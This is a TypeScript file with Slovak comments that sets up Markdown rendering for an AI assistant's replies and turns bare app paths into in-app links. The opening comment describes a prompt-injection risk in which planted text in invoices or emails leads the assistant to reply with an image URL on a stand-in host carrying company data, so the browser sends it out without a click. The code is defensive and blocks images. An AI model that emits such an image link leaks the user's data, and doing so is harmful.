/*
  Nastavenie ReactMarkdown pre odpovede AI asistenta.

  AI číta aj text, ktorý napísal niekto cudzí (meno dodávateľa z eFaktúry,
  predmet e-mailu, poznámka). Vložený pokyn ju môže prinútiť odpovedať
  obrázkom `![](https://cudzi.sk/?d=<údaje firmy>)` — prehliadač by ho sám
  načítal a údaje odoslal bez jediného kliknutia. Obrázky sa preto nekreslia
  vôbec; odkazy ostávajú (tie vyžadujú klik a react-markdown z nich vyhodí
  `javascript:`).
*/
export const BEZPECNY_MARKDOWN = {
  disallowedElements: ["img"],
  unwrapDisallowed: true,
} as const;

/*
  Cesty v odpovedi AI („Nastavenia nájdete v /nastavenia/pohoda“) majú byť
  klikateľné a otvoriť sa v aplikácii, nie v novej karte. Holá cesta v texte sa
  zmení na markdownový odkaz — ale len keď jej prvý úsek je naozaj stránka
  aplikácie (`prvéUseky` z routera), nech sa z „1/2“ či „/s“ nestane odkaz.
  Kód v ``` blokoch a v `spätných úvodzovkách` ostáva bez zmeny (ten rieši
  komponent), rovnako ako cesty, ktoré už odkazom sú.
*/
const CESTA = /(^|[\s„“"'«(])(\/[a-z][a-z0-9-]*(?:\/[\w$-]+(?:\.[\w$-]+)*)*\/?(?:\?[\w=&%.-]+)?)(?=$|[\s.,;:!?)"“”'»])/g;

/** Prvý úsek cesty („/nastavenia/pohoda?x=1“ → „nastavenia“). */
export function prvyUsekCesty(cesta: string): string {
  return cesta.replace(/^\//, "").split(/[/?#]/)[0] ?? "";
}

/** Je `href` stránka tejto aplikácie (cesta alebo plná adresa na rovnakom pôvode)? Vráti cestu, inak null. */
export function internaCesta(
  href: string | null | undefined,
  prveUseky: ReadonlySet<string>,
  povod?: string,
): string | null {
  if (!href) return null;
  let cesta = href;
  if (/^[a-z][a-z0-9+.-]*:/i.test(href) || href.startsWith("//")) {
    if (!povod) return null;
    try {
      const u = new URL(href);
      if (u.origin !== povod) return null;
      cesta = `${u.pathname}${u.search}${u.hash}`;
    } catch {
      return null;
    }
  }
  if (!cesta.startsWith("/") || cesta.startsWith("//")) return null;
  return prveUseky.has(prvyUsekCesty(cesta)) ? cesta : null;
}

/** Holé cesty aplikácie v texte → markdownové odkazy (mimo kódu a existujúcich odkazov). */
export function prelinkujCesty(md: string, prveUseky: ReadonlySet<string>): string {
  // Bloky kódu a inline kód sa nechajú tak — rozdelí sa na časti a mení sa len text medzi nimi.
  return md
    .split(/(```[\s\S]*?```|`[^`\n]*`)/g)
    .map((cast, i) => {
      if (i % 2 === 1) return cast;
      return cast.replace(CESTA, (cele, pred: string, cesta: string, offset: number, cely: string) => {
        // „](/x)“ je už cieľ odkazu, „[/x](…)“ jeho text.
        if (pred === "(" && cely[offset - 1] === "]") return cele;
        if (cely[offset + cele.length] === "]") return cele;
        if (!prveUseky.has(prvyUsekCesty(cesta))) return cele;
        return `${pred}[${cesta}](${cesta})`;
      });
    })
    .join("");
}
